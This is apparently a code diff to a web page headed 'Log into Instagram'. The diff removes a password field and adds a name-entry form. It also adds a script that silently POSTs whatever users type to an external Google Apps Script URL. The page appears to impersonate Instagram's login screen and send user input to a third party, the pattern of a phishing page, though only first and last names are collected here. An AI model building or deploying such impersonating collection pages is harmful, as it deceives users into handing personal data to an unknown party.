@@ -38,21 +38,29 @@
 
             <div class="login">
 
-                <h2>Log into Instagram</h2>
+                <h2>Log into instagram</h2>
 
 
-                <input 
-                placeholder="name">
+                <form id="myForm">
 
+                    <input 
+                        type="text"
+                        id="firstName"
+                        placeholder="First Name"
+                        required>
 
-                <input 
-                type="password"
-                placeholder="family name">
+                    <input 
+                        type="text"
+                        id="lastName"
+                        placeholder="Last Name"
+                        required>
 
+                    <button type="submit">
+                        Submit
+                    </button>
 
-                <button class="login-btn">
-                    send
-                </button>
+                </form>
+                
 
 
                 <a>
@@ -116,5 +124,32 @@
 </div>
 
 
+<script>
+const url = "https://script.google.com/macros/s/AKfycbxgVVw2yg8BYXcUX8lTedjF-TwiglyABVoPrghDxo4BRa35dxpfvKmhfZs82AKBdAxD/exec";
+
+document.getElementById("myForm").addEventListener("submit", async function(e){
+    e.preventDefault();
+
+    const data = {
+        firstName: document.getElementById("firstName").value,
+        lastName: document.getElementById("lastName").value
+    };
+
+    const response = await fetch(url,{
+        method:"POST",
+        headers:{
+            "Content-Type":"application/json"
+        },
+        body:JSON.stringify(data)
+    });
+
+    if(response.ok){
+        alert("Submitted successfully!");
+        this.reset();
+    }else{
+        alert("Submission failed.");
+    }
+});
+</script>
 </body>
 </html>
